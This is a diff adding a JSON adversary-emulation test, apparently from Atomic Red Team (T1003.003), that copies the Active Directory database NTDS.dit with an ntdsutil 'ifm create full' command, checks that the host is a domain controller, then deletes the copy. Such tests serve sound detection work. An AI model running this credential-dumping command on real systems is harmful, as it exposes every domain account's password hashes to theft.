@@ -1,0 +1,105 @@
+{
+  "id": "2364e33d-ceab-4641-8468-bfb1d7cc2723",
+  "name": "Dump Active Directory Database with NTDSUtil",
+  "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped using NTDSUtil for offline credential theft attacks. This capability\nuses the \"IFM\" or \"Install From Media\" backup functionality that allows Active Directory restoration or installation of\nsubsequent domain controllers without the need of network-based replication.\n\nUpon successful completion, you will find a copy of the ntds.dit file in the C:\\Windows\\Temp directory.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "556d9001-2aca-44cb-9d36-37f54ff52767",
+      "type": "execute-command",
+      "data": {
+        "command": "mkdir #{output_folder}\nntdsutil \"ac i ntds\" \"ifm\" \"create full #{output_folder}\" q q\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "47e4944f-b4ed-4ec1-b603-e47ecdd95dbc",
+      "type": "execute-command",
+      "data": {
+        "command": "rmdir /q /s #{output_folder} \u003enul 2\u003e\u00261\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "72fbcabb-e866-4f05-a4cc-a793d9514586",
+      "name": "Check dependency 1/1",
+      "description": "Target must be a Domain Controller\n",
+      "type": "execute-command",
+      "data": {
+        "command": "reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ProductOptions  /v ProductType | findstr LanmanNT\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "4d3de7fa-597d-40ae-a4f5-40eb223b5895",
+      "name": "Resolve dependency 1/1",
+      "description": "Target must be a Domain Controller\n",
+      "type": "execute-command",
+      "data": {
+        "command": "echo Sorry, Promoting this machine to a Domain Controller must be done manually\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "fd3fbef7-f3de-49aa-b338-76604084d722",
+      "name": "Re-check dependency 1/1",
+      "description": "Target must be a Domain Controller\n",
+      "type": "execute-command",
+      "data": {
+        "command": "reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ProductOptions  /v ProductType | findstr LanmanNT\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "556d9001-2aca-44cb-9d36-37f54ff52767",
+      "p": "on-success",
+      "o": "47e4944f-b4ed-4ec1-b603-e47ecdd95dbc"
+    },
+    {
+      "s": "556d9001-2aca-44cb-9d36-37f54ff52767",
+      "p": "on-failure",
+      "o": "47e4944f-b4ed-4ec1-b603-e47ecdd95dbc"
+    },
+    {
+      "s": "72fbcabb-e866-4f05-a4cc-a793d9514586",
+      "p": "on-success",
+      "o": "556d9001-2aca-44cb-9d36-37f54ff52767"
+    },
+    {
+      "s": "72fbcabb-e866-4f05-a4cc-a793d9514586",
+      "p": "on-failure",
+      "o": "4d3de7fa-597d-40ae-a4f5-40eb223b5895"
+    },
+    {
+      "s": "4d3de7fa-597d-40ae-a4f5-40eb223b5895",
+      "p": "on-success",
+      "o": "fd3fbef7-f3de-49aa-b338-76604084d722"
+    },
+    {
+      "s": "fd3fbef7-f3de-49aa-b338-76604084d722",
+      "p": "on-failure",
+      "o": "556d9001-2aca-44cb-9d36-37f54ff52767"
+    }
+  ],
+  "tags": [
+    "T1003.003",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "output_folder",
+      "type": "path",
+      "description": "Path where resulting dump should be placed",
+      "value": "C:\\Windows\\Temp\\ntds_T1003"
+    }
+  ]
+}
